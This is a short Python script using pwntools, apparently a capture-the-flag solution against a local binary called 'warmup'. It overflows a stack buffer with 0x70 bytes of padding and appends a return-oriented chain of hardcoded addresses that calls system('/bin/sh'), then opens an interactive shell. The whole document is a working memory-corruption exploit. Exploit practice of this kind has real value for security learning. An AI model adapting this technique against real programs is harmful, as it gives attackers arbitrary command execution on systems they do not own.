from pwn import *
context(log_level="debug")
p = process('./warmup')
p.recvuntil('\n')
p.sendline()
raw_input()
pr0_pr4_ret  =0x00020904
bin_sh = 0x6C384
system = 0x110B4
payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(0)+p32(system)
p.sendline('a'*0x70+payload)
p.interactive()